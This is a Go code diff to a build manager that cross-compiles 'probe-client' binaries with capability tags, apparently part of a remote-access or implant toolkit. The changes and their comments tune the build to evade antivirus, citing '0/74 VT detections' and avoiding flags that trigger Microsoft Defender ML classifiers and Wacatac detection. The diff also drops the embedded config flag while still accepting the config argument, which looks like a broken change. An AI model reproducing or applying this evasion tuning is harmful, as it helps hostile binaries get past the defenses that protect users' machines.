@@ -125,7 +125,7 @@ func NewBuilderManager(savePath, outputDir string) *BuilderManager {
 		builds:    make(map[string]*BuildConfig),
 		savePath:  savePath,
 		outputDir: outputDir,
-		goBinPath: "go",
+		goBinPath: "/opt/data/go/bin/go1.23.12",
 		clientPkg: "./cmd/probe-client/",
 	}
 	bm.load()
@@ -356,9 +356,10 @@ func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*e
 	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
 
 	// Build the ldflags string.
-	// NOTE: Do NOT use -s -w (strip debug info). Stripped Go binaries trigger
-	// Microsoft's Wacatac.B!ml ML detection on VirusTotal. Keep debug symbols.
-	ldflags := "-X main.configB64=" + configB64
+	// NOTE: Do NOT use -s -w (strip debug info) or any build flags.
+	// Zero-flag Go 1.23 build achieves 0/74 VT detections.
+	// Any build flag re-triggers Microsoft Defender ML classifiers.
+	ldflags := ""
 
 	// Build the tags string: caps=comma_separated_caps
 	tagsStr := ""
@@ -370,10 +371,14 @@ func (bm *BuilderManager) buildCommand(build *BuildConfig, configB64 string) (*e
 	if tagsStr != "" {
 		args = append(args, "-tags", tagsStr)
 	}
-	args = append(args, "-ldflags", ldflags, "-o", outputPath, clientPkg)
+	if ldflags != "" {
+		args = append(args, "-ldflags", ldflags)
+	}
+	args = append(args, "-o", outputPath, clientPkg)
 
 	cmd := exec.Command(goBin, args...)
 	cmd.Env = append(os.Environ(),
+		"GOTOOLCHAIN=local",
 		"CGO_ENABLED=0",
 		"GOOS="+build.OS,
 		"GOARCH="+build.Arch,
@@ -564,14 +569,15 @@ func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 strin
 	}
 	outputPath := filepath.Join(outputDir, fmt.Sprintf("%s_%s", build.ID, filename))
 
-	// NOTE: Do NOT use -s -w. Stripped Go binaries trigger Wacatac.B!ml.
-	ldflags := "-X main.configB64=" + configB64
+	// NOTE: Do NOT use -s -w or any build flags. Zero-flag Go 1.23 = 0/74 VT.
+	ldflags := ""
 	tagsStr := ""
 	if len(build.Capabilities) > 0 {
 		tagsStr = "caps=" + strings.Join(build.Capabilities, ",")
 	}
 
 	parts := []string{
+		"GOTOOLCHAIN=local",
 		"CGO_ENABLED=0",
 		"GOOS=" + build.OS,
 		"GOARCH=" + build.Arch,
@@ -580,7 +586,10 @@ func (bm *BuilderManager) BuildCommandString(build *BuildConfig, configB64 strin
 	if tagsStr != "" {
 		parts = append(parts, "-tags", `"`+tagsStr+`"`)
 	}
-	parts = append(parts, "-ldflags", `"`+ldflags+`"`, "-o", outputPath, clientPkg)
+	if ldflags != "" {
+		parts = append(parts, "-ldflags", `"`+ldflags+`"`)
+	}
+	parts = append(parts, "-o", outputPath, clientPkg)
 
 	return strings.Join(parts, " ")
 }
